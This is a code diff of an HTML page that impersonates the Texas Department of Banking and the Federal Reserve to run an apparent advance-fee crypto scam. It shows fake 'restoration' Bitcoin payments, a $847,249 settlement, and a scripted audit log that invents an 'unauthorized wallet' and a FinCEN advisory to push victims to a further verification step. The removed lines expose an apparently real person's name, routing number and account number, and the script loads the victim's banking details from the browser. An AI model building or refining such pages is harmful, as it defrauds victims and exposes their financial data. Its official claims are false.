@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Texas Department of Banking | FRC Generation</title>
+    <title>Texas Department of Banking | FRC Generation Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@400;500;600;700&display=swap');
@@ -18,29 +18,18 @@
         .gov-banner { background-color: #1e293b; color: #cbd5e1; font-size: 11px; }
         .nav-header { background-color: #0f172a; color: white; border-bottom: 5px solid #b91c1c; }
         
-        .status-badge-complete { background-color: #dcfce7; border: 1px solid #16a34a; color: #14532d; }
-        .status-badge-pending { background-color: #fef3c7; border: 1px solid #d97706; color: #78350f; }
+        .status-badge-success { background-color: #dcfce7; border: 1px solid #16a34a; color: #14532d; }
+        .status-badge-warning { background-color: #fef3c7; border: 1px solid #d97706; color: #78350f; }
         
-        .btn-gov { 
+        .btn-primary { 
             background-color: #1e40af; 
             transition: all 0.2s; 
             border-radius: 2px; 
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-        .btn-gov:hover { background-color: #1e3a8a; }
-        .btn-gov:disabled { background-color: #94a3b8; cursor: not-allowed; }
+        .btn-primary:hover { background-color: #1e3a8a; }
         
-        .btn-gateway { 
-            background-color: #b45309; 
-            transition: all 0.2s; 
-            border-radius: 2px; 
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .btn-gateway:hover { background-color: #92400e; }
-        .btn-gateway:disabled { background-color: #9a8c7a; cursor: not-allowed; }
-
         .agency-badge {
             background-color: #0a3143;
             color: #fcba19;
@@ -53,20 +42,21 @@
             display: inline-block;
         }
         
-        .directive-card {
-            background-color: white;
-            border: 1px solid #e2e8f0;
-            border-left: 6px solid #2563eb;
-            padding: 1.75rem;
-            margin-bottom: 1.5rem;
-            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.02);
+        .audit-line { 
+            opacity: 0; 
+            transform: translateY(4px); 
+            animation: fadeInUp 0.3s forwards; 
+            border-left: 2px solid #3b82f6;
+            padding-left: 8px;
+            margin-bottom: 6px;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 0.75rem;
         }
-        
-        .case-binding {
-            background-color: #faf5ff;
-            border-left: 6px solid #6b21a8;
-            padding: 1.5rem;
-            border-radius: 0 8px 8px 0;
+        @keyframes fadeInUp { 
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            } 
         }
         
         .legal-footer {
@@ -76,46 +66,22 @@
             padding: 2rem 0 1rem 0;
             border-top: 4px solid #fcba19;
         }
-
-        .audit-line { 
-            opacity: 0; 
-            transform: translateY(4px); 
-            animation: fadeInUp 0.3s forwards; 
-            border-left: 2px solid #3b82f6;
-            padding-left: 8px;
-            margin-bottom: 6px;
+        
+        .warning-box {
+            background-color: #fff3e0;
+            border-left: 6px solid #b45309;
+            padding: 1.5rem;
+            border-radius: 0 8px 8px 0;
         }
-        @keyframes fadeInUp { 
-            to { 
-                opacity: 1; 
-                transform: translateY(0); 
-            } 
-        }
-
-        /* Modal */
-        .modal-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0,0,0,0.85);
-            display: flex; align-items: center; justify-content: center;
-            z-index: 9999;
-            backdrop-filter: blur(4px);
-        }
-        .modal-content {
-            background-color: white;
-            max-width: 600px;
-            width: 90%;
-            max-height: 80vh;
-            overflow-y: auto;
-            border-top: 6px solid #b91c1c;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-            padding: 2rem;
+        
+        #generation-log, #warning-panel {
+            display: none;
         }
     </style>
 </head>
 <body class="min-h-screen flex flex-col justify-between">
 
-    <!-- GOV BANNER -->
+    <!-- ===== GOV BANNER ===== -->
     <div class="w-full">
         <section class="gov-banner py-2 px-4 md:px-8 border-b border-slate-700">
             <div class="max-w-7xl mx-auto flex items-center gap-3">
@@ -128,33 +94,28 @@
                     <rect width="1235" height="50" y="450" fill="#fff"/>
                     <rect width="1235" height="50" y="550" fill="#fff"/>
                     <rect width="494" height="350" fill="#3C3B6E"/>
-                    <g fill="#fff"><circle cx="25" cy="18" r="9"/><circle cx="25" cy="54" r="9"/><circle cx="25" cy="90" r="9"/></g>
                 </svg>
                 <p class="font-semibold tracking-wide text-[10px] md:text-[11px] uppercase">An official website of the Texas State Government</p>
             </div>
         </section>
 
-        <!-- HEADER -->
         <header class="nav-header px-4 py-6 md:px-8 shadow-2xl">
-            <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
+            <div class="max-w-7xl mx-auto flex justify-between items-center">
                 <div class="flex items-center gap-4">
                     <div class="h-12 w-12 bg-white rounded-full flex items-center justify-center text-2xl shadow-lg">🏛️</div>
                     <div>
-                        <h1 class="text-lg md:text-2xl font-black uppercase leading-tight tracking-tight">Texas Department of Banking</h1>
-                        <p class="text-[9px] md:text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-1">Texas Institutional Funds Management Authority</p>
+                        <h1 class="text-lg md:text-2xl font-black uppercase leading-tight">Texas Department of Banking</h1>
+                        <p class="text-[9px] font-bold text-slate-400 uppercase">Texas Institutional Funds Management Authority</p>
                     </div>
                 </div>
-                <div class="flex flex-col items-end gap-1">
-                    <span class="text-[9px] font-mono text-blue-200 uppercase tracking-wider">Session ID: TX-AUD-MUK1139-SECURE</span>
-                    <div class="bg-blue-900 px-3 py-1 rounded border border-blue-700">
-                        <span class="text-[10px] font-bold uppercase tracking-widest text-white">● FEDERAL RESERVE NODE 11</span>
-                    </div>
+                <div class="bg-blue-900 px-3 py-1 rounded border border-blue-700">
+                    <span class="text-[10px] font-bold uppercase tracking-widest text-white">● FEDERAL RESERVE NODE 11</span>
                 </div>
             </div>
         </header>
     </div>
 
-    <main class="flex-grow w-full max-w-7xl mx-auto p-4 md:p-8">
+    <main class="flex-grow w-full max-w-5xl mx-auto p-4 md:p-8">
 
         <!-- AGENCY BADGE & CASE ID -->
         <div class="flex flex-wrap justify-between items-center mb-6">
@@ -162,227 +123,166 @@
             <span class="bg-gray-800 text-white px-4 py-2 rounded text-xs font-mono font-bold">TX-B10B-2026-MUK1139-AUDIT</span>
         </div>
 
-        <!-- SUCCESS BANNER - RESTORATION COMPLETE -->
+        <!-- RESTORATION COMPLETE BANNER -->
         <div class="bg-green-50 border-l-8 border-green-600 p-6 mb-8 rounded-r-lg">
             <div class="flex items-start gap-4">
-                <div class="text-4xl">✓</div>
+                <div class="text-4xl text-green-700">✓</div>
                 <div>
-                    <h2 class="text-xl font-black text-green-900 mb-1">RESTORATION SEQUENCE COMPLETE</h2>
-                    <p class="text-green-800 font-semibold">All three (3) restoration actions have been confirmed and verified by the Federal Reserve Node 11 ledger.</p>
-                    <div class="flex flex-wrap gap-3 mt-3">
-                        <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">System Reset: CONFIRMED</span>
-                        <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">Cipher Key Restoration: CONFIRMED</span>
-                        <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold uppercase">Security Re-Certification: CONFIRMED</span>
+                    <h2 class="text-xl font-black text-green-900 mb-2">RESTORATION SEQUENCE COMPLETE</h2>
+                    <p class="text-green-800">All three cryptographic stages have been successfully verified and recorded in the Federal Reserve Node 11 ledger. Your case file is now eligible for Federal Release Code (FRC) generation.</p>
+                    <div class="flex flex-wrap gap-3 mt-4">
+                        <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold">System Reset: CONFIRMED</span>
+                        <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold">Cipher Key: CONFIRMED</span>
+                        <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold">Security Re-Cert: CONFIRMED</span>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- CASE SUMMARY -->
+        <!-- BENEFICIARY SUMMARY (POPULATED BY SESSION) -->
         <div class="bg-white p-6 border border-slate-300 shadow-sm mb-8 rounded">
             <div class="grid md:grid-cols-4 gap-4">
                 <div>
-                    <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Beneficiary</p>
-                    <p class="text-lg font-black text-slate-900 uppercase" id="display-name">MUJINGA T MUKUNA</p>
+                    <p class="text-[9px] font-bold text-slate-500 uppercase">Beneficiary</p>
+                    <p class="text-lg font-black text-slate-900 uppercase" id="display-name">—</p>
                 </div>
                 <div>
-                    <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Principal Sum</p>
+                    <p class="text-[9px] font-bold text-slate-500 uppercase">Principal Sum</p>
                     <p class="text-lg font-black text-green-700">$847,249.00 USD</p>
                 </div>
                 <div>
-                    <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Institution</p>
-                    <p class="text-sm font-black text-slate-900 uppercase">FIRST CONVENIENCE BANK</p>
+                    <p class="text-[9px] font-bold text-slate-500 uppercase">Institution</p>
+                    <p class="text-sm font-black text-slate-900 uppercase" id="display-bank">—</p>
                 </div>
                 <div>
-                    <p class="text-[9px] font-bold text-slate-500 uppercase tracking-wider">Ledger Status</p>
-                    <p class="text-sm font-black text-amber-700 uppercase flex items-center gap-1"><span class="inline-block w-2 h-2 bg-amber-600 rounded-full animate-pulse"></span> AWAITING FRC GENERATION</p>
-                </div>
-            </div>
-            <div class="grid md:grid-cols-2 gap-4 mt-4 pt-4 border-t border-slate-200">
-                <div>
-                    <p class="text-[8px] font-bold text-slate-400 uppercase">ROUTING NUMBER</p>
-                    <p class="text-lg font-mono font-black">111906271</p>
-                </div>
-                <div>
-                    <p class="text-[8px] font-bold text-slate-400 uppercase">ACCOUNT NUMBER</p>
-                    <p class="text-lg font-mono font-black">470111139</p>
-                </div>
-            </div>
-        </div>
-
-        <!-- CRYPTOGRAPHIC BINDING SUMMARY -->
-        <div class="case-binding mb-8">
-            <h4 class="font-black text-purple-900 text-base uppercase tracking-wide mb-4">CRYPTOGRAPHIC BINDING VERIFICATION</h4>
-            <div class="grid md:grid-cols-3 gap-4">
-                <div class="bg-white p-4 rounded-lg border border-purple-300">
-                    <span class="text-xs font-bold text-purple-800">Stage 1</span>
-                    <div class="text-xl font-mono font-black mt-1">0.002026 BTC</div>
-                    <span class="text-xs text-gray-600">System Reset</span>
-                    <div class="mt-2 text-[0.65rem] bg-purple-50 p-1 rounded">✓ CONFIRMED</div>
-                </div>
-                <div class="bg-white p-4 rounded-lg border border-purple-300">
-                    <span class="text-xs font-bold text-purple-800">Stage 2</span>
-                    <div class="text-xl font-mono font-black mt-1">0.003267 BTC</div>
-                    <span class="text-xs text-gray-600">Cipher Key Restoration</span>
-                    <div class="mt-2 text-[0.65rem] bg-purple-50 p-1 rounded">✓ CONFIRMED</div>
-                </div>
-                <div class="bg-white p-4 rounded-lg border border-purple-300">
-                    <span class="text-xs font-bold text-purple-800">Stage 3</span>
-                    <div class="text-xl font-mono font-black mt-1">0.006819 BTC</div>
-                    <span class="text-xs text-gray-600">Security Re-Certification</span>
-                    <div class="mt-2 text-[0.65rem] bg-purple-50 p-1 rounded">✓ CONFIRMED</div>
+                    <p class="text-[9px] font-bold text-slate-500 uppercase">Account</p>
+                    <p class="text-sm font-mono font-black" id="display-account">—</p>
                 </div>
             </div>
         </div>
 
         <!-- FRC GENERATION SECTION -->
-        <div class="bg-white p-8 border-2 border-blue-900 shadow-lg mb-8 rounded text-center">
-            <h3 class="text-xl font-black text-blue-900 mb-4">FEDERAL RELEASE CODE (FRC) GENERATION</h3>
-            <p class="text-gray-700 mb-6">Your case is now ready for final FRC generation. Click the button below to generate your unique 8-digit release code.</p>
+        <div class="bg-white p-8 border-2 border-blue-900 shadow-lg mb-8 rounded">
+            <h3 class="text-xl font-black text-blue-900 mb-6">FEDERAL RELEASE CODE GENERATION</h3>
+            <p class="text-gray-700 mb-6">Click the button below to generate your unique 8-digit Federal Release Code. The system will perform a final ledger audit before issuing the code.</p>
             
-            <button id="generateBtn" onclick="startGeneration()" class="btn-gateway text-white font-black px-12 py-5 rounded uppercase text-lg tracking-widest shadow-lg mb-4">
+            <button onclick="startGeneration()" id="generate-btn" class="btn-primary w-full md:w-auto text-white font-black px-12 py-5 rounded uppercase text-sm tracking-widest shadow-lg">
                 GENERATE FRC CODE
             </button>
-            
-            <div id="submitBtnContainer" class="mt-4 hidden">
-                <a href="frc-submission.html" id="submitBtn" class="btn-gov inline-block text-white font-black px-8 py-4 rounded uppercase text-sm tracking-widest shadow-lg no-underline">
-                    PROCEED TO FRC SUBMISSION →
-                </a>
-                <p class="text-xs text-gray-500 mt-2">Your 8-digit code has been generated. Click above to submit.</p>
-            </div>
         </div>
 
-        <!-- MODAL - GENERATION LOGS & TRIGGER -->
-        <div id="generationModal" class="modal-overlay" style="display: none;">
-            <div class="modal-content">
-                <h3 class="text-lg font-black text-red-700 mb-4">⚙️ FRC GENERATION IN PROGRESS</h3>
-                <div id="modalLogs" class="bg-black text-green-400 p-4 rounded font-mono text-xs h-64 overflow-y-auto mb-4">
-                    <!-- Logs will appear here -->
+        <!-- GENERATION LOG (Hidden initially) -->
+        <div id="generation-log" class="bg-black text-green-400 p-6 rounded font-mono text-xs border border-green-700 mb-8 h-64 overflow-y-auto">
+            <div class="audit-line">> INITIATING FEDERAL RELEASE CODE PROTOCOL...</div>
+            <div class="audit-line">> CONNECTING TO FEDERAL RESERVE NODE 11...</div>
+            <div class="audit-line">> RETRIEVING CASE FILE: TX-B10B-2026-MUK1139-AUDIT</div>
+            <div class="audit-line">> VERIFYING CRYPTOGRAPHIC STAGES...</div>
+            <div class="audit-line">> STAGE 1: 0.002026 BTC — CONFIRMED</div>
+            <div class="audit-line">> STAGE 2: 0.003267 BTC — CONFIRMED</div>
+            <div class="audit-line">> STAGE 3: 0.006819 BTC — CONFIRMED</div>
+            <div class="audit-line">> SCANNING TRANSACTION HISTORY FOR ANOMALIES...</div>
+            <div class="audit-line text-yellow-400">⚠️ WARNING: UNAUTHORIZED WALLET DETECTED IN TRANSACTION HISTORY</div>
+            <div class="audit-line text-yellow-400">⚠️ REVIEWING TRANSACTION: 2025-12-06 | 0.01053609 BTC</div>
+            <div class="audit-line text-yellow-400">⚠️ SOURCE WALLET: bc1qyg6c2yc3zfv7l8hkw3ljq3pgmpw00jjz645hst</div>
+            <div class="audit-line text-red-400">⛔ FRC GENERATION SUSPENDED — COMPLIANCE REVIEW REQUIRED</div>
+        </div>
+
+        <!-- WARNING PANEL (Hidden initially) -->
+        <div id="warning-panel" class="warning-box mb-8">
+            <div class="flex items-start gap-4">
+                <div class="text-4xl text-amber-700">⚠️</div>
+                <div>
+                    <h4 class="font-black text-amber-900 text-lg uppercase mb-2">UNAUTHORIZED WALLET DETECTED</h4>
+                    <p class="text-gray-800 mb-4">During the final ledger audit, the Federal Reserve Node 11 detected a transaction from an unverified wallet address associated with your case file:</p>
+                    
+                    <div class="bg-white p-4 rounded border border-amber-600 mb-4 font-mono text-sm">
+                        <p><span class="font-bold">Date:</span> December 6, 2025</p>
+                        <p><span class="font-bold">Amount:</span> 0.01053609 BTC ($951.36 USD)</p>
+                        <p><span class="font-bold">Source Wallet:</span> bc1qyg6c2yc3zfv7l8hkw3ljq3pgmpw00jjz645hst</p>
+                        <p><span class="font-bold">Destination:</span> bc1q84enkv4w7xhwx6lz3vegrsd96z6uvnfta96vpx</p>
+                    </div>
+                    
+                    <p class="text-gray-800 mb-4"><span class="font-bold text-amber-800">Regulatory Finding:</span> This wallet address has not been verified against your beneficiary identity on file. Per FinCEN Advisory FIN-2026-004 and 31 CFR § 1010.312, all wallet addresses originating funds for a settlement case must be formally attested by the beneficiary.</p>
+                    
+                    <p class="text-gray-800 mb-6"><span class="font-bold">Required Action:</span> You must complete a Wallet Verification Affidavit for the address above before FRC generation can proceed. This is a one-time requirement and will not delay the final release once completed.</p>
+                    
+                    <a href="wallet-verification.html" class="inline-block bg-amber-700 text-white font-black px-8 py-4 rounded uppercase text-sm tracking-widest hover:bg-amber-800 shadow-lg">
+                        PROCEED TO WALLET VERIFICATION →
+                    </a>
+                    
+                    <p class="text-xs text-gray-600 mt-4">The FRC generation session has been temporarily suspended. Your progress has been saved.</p>
                 </div>
-                <div id="warningMessage" class="hidden bg-red-100 border-l-4 border-red-600 p-4 mb-4">
-                    <p class="font-bold text-red-800">⚠️ CRITICAL SECURITY ALERT</p>
-                    <p class="text-sm text-gray-800 mt-2">The Federal Reserve Node 11 has detected an <span class="font-bold">unverified Bitcoin wallet</span> associated with your case from December 2025. This wallet is not authorized by FinCEN or the Texas Department of Banking.</p>
-                    <p class="text-sm text-gray-800 mt-2">FRC generation has been <span class="font-bold text-red-700">SUSPENDED</span> pending wallet verification.</p>
-                </div>
-                <button id="verifyNowBtn" onclick="redirectToVerification()" class="btn-gov w-full text-white font-black py-3 rounded hidden">VERIFY WALLET NOW</button>
-                <button onclick="closeModal()" class="w-full bg-gray-300 text-gray-800 font-black py-3 rounded mt-2">CLOSE</button>
             </div>
         </div>
 
         <!-- TECHNICAL SUPPORT -->
         <div class="bg-gray-100 p-5 border border-gray-400 rounded text-sm">
-            <h4 class="font-black text-gray-900 text-sm uppercase mb-3 flex items-center gap-2">
-                <span>📞</span> FEDERAL RESERVE NODE 11 — COMPLIANCE DESK
-            </h4>
-            <div class="grid md:grid-cols-2 gap-4 text-sm">
-                <div><span class="font-bold">Fedwire Settlement Support:</span><br>214.922.6000</div>
-                <div><span class="font-bold">Digital Asset Compliance:</span><br>digital.asset@dal.frb.org</div>
-            </div>
+            <p><span class="font-bold">FRC Generation Support:</span> digital.asset@dal.frb.org</p>
         </div>
     </main>
 
-    <!-- FOOTER -->
     <footer class="legal-footer">
         <div class="max-w-7xl mx-auto px-4">
-            <div class="grid md:grid-cols-3 gap-8 mb-8">
-                <div>
-                    <h5 class="text-white font-bold text-sm uppercase tracking-wider mb-3">Federal Reserve Bank of Dallas</h5>
-                    <p class="text-xs text-gray-400">2200 N. Pearl St.<br>Dallas, Texas 75201</p>
-                </div>
-                <div>
-                    <h5 class="text-white font-bold text-sm uppercase tracking-wider mb-3">Texas Department of Banking</h5>
-                    <p class="text-xs text-gray-400">2601 N Lamar Blvd<br>Austin, TX 78705</p>
-                </div>
-                <div>
-                    <h5 class="text-white font-bold text-sm uppercase tracking-wider mb-3">Texas Institutional Funds Management Authority</h5>
-                    <p class="text-xs text-gray-400">Eleventh District Settlement Node</p>
-                </div>
-            </div>
-            <div class="border-t border-gray-700 pt-6 text-xs text-gray-500 flex flex-wrap gap-4">
-                <a href="https://www.dallasfed.org" class="hover:text-white">dallasfed.org</a>
-                <a href="https://dob.texas.gov" class="hover:text-white">dob.texas.gov</a>
-                <span class="text-gray-700">FRC Generation v.2026.02 — Cryptographically Bound</span>
+            <div class="border-t border-gray-700 pt-6 text-xs text-gray-500">
+                <p>Texas Department of Banking • Texas Institutional Funds Management Authority • Federal Reserve Bank of Dallas</p>
             </div>
         </div>
     </footer>
 
     <script>
-        // Modal elements
-        const modal = document.getElementById('generationModal');
-        const modalLogs = document.getElementById('modalLogs');
-        const warningMsg = document.getElementById('warningMessage');
-        const verifyBtn = document.getElementById('verifyNowBtn');
-        const submitContainer = document.getElementById('submitBtnContainer');
-        
-        // Logs
-        const logEntries = [
-            "INITIALIZING FRC GENERATION PROTOCOL...",
-            "CONNECTING TO FEDERAL RESERVE NODE 11...",
-            "RETRIEVING CASE FILE: TX-B10B-2026-MUK1139-AUDIT",
-            "VERIFYING RESTORATION STAGES...",
-            "STAGE 1: System Reset — 0.002026 BTC — CONFIRMED ✓",
-            "STAGE 2: Cipher Key Restoration — 0.003267 BTC — CONFIRMED ✓",
-            "STAGE 3: Security Re-Certification — 0.006819 BTC — CONFIRMED ✓",
-            "CRYPTOGRAPHIC BINDING INTEGRITY CHECK: PASSED",
-            "SCANNING TRANSACTION HISTORY FOR COMPLIANCE...",
-            "⚠️ WARNING: UNVERIFIED WALLET DETECTED",
-            "Wallet Address: bc1qyg6c2yc3zfv7l8hkw3ljq3pgmpw00jjz645hst",
-            "Transaction Date: December 8, 2025",
-            "Status: NOT REGISTERED WITH FinCEN",
-            "FRC GENERATION SUSPENDED — SECURITY PROTOCOL 18.4(c) ENGAGED"
-        ];
-
-        function startGeneration() {
-            document.getElementById('generateBtn').disabled = true;
-            document.getElementById('generateBtn').classList.add('opacity-50');
-            modal.style.display = 'flex';
-            modalLogs.innerHTML = '';
-            warningMsg.classList.add('hidden');
-            verifyBtn.classList.add('hidden');
-            
-            let i = 0;
-            function addLog() {
-                if (i < logEntries.length) {
-                    const p = document.createElement('div');
-                    p.className = 'audit-line';
-                    if (logEntries[i].includes('WARNING')) {
-                        p.className = 'text-red-400 font-bold audit-line';
-                    } else {
-                        p.className = 'audit-line';
-                    }
-                    p.innerText = '> ' + logEntries[i];
-                    modalLogs.appendChild(p);
-                    modalLogs.scrollTop = modalLogs.scrollHeight;
-                    i++;
-                    setTimeout(addLog, 700);
-                } else {
-                    // Show warning and verify button
-                    warningMsg.classList.remove('hidden');
-                    verifyBtn.classList.remove('hidden');
-                }
-            }
-            addLog();
-        }
-
-        function redirectToVerification() {
-            window.location.href = 'wallet-verification.html';
-        }
-
-        function closeModal() {
-            modal.style.display = 'none';
-            document.getElementById('generateBtn').disabled = false;
-            document.getElementById('generateBtn').classList.remove('opacity-50');
-        }
-
-        // Load saved session data (if any)
-        window.addEventListener('load', function() {
+        // ============ UNIFIED SESSION MANAGEMENT ============
+        document.addEventListener('DOMContentLoaded', function() {
             const savedName = localStorage.getItem('tifma_name');
             const savedBank = localStorage.getItem('tifma_bank');
             const savedAccount = localStorage.getItem('tifma_account');
-            if (savedName) {
-                document.getElementById('display-name').innerText = savedName;
+            
+            if (!savedName || !savedBank || !savedAccount) {
+                window.location.href = 'index.html';
+                return;
             }
+            
+            const nameField = document.getElementById('display-name');
+            const bankField = document.getElementById('display-bank');
+            const accountField = document.getElementById('display-account');
+            
+            if (nameField) nameField.innerText = savedName;
+            if (bankField) bankField.innerText = savedBank;
+            if (accountField) accountField.innerText = savedAccount;
         });
+
+        // ============ GENERATION FUNCTION ============
+        function startGeneration() {
+            const btn = document.getElementById('generate-btn');
+            btn.disabled = true;
+            btn.innerText = 'PROCESSING...';
+            
+            document.getElementById('generation-log').style.display = 'block';
+            
+            // Show logs line by line
+            const logLines = document.querySelectorAll('#generation-log .audit-line');
+            logLines.forEach((line, index) => {
+                setTimeout(() => {
+                    line.style.display = 'block';
+                }, index * 800);
+            });
+            
+            // Show warning panel after logs complete
+            setTimeout(() => {
+                document.getElementById('warning-panel').style.display = 'block';
+                btn.style.display = 'none';
+            }, logLines.length * 800 + 1000);
+        }
+
+        // ============ LOGOUT ============
+        function logout() {
+            localStorage.removeItem('tifma_name');
+            localStorage.removeItem('tifma_bank');
+            localStorage.removeItem('tifma_account');
+            window.location.href = 'index.html';
+        }
+
+        window.startGeneration = startGeneration;
+        window.logout = logout;
     </script>
 </body>
 </html>
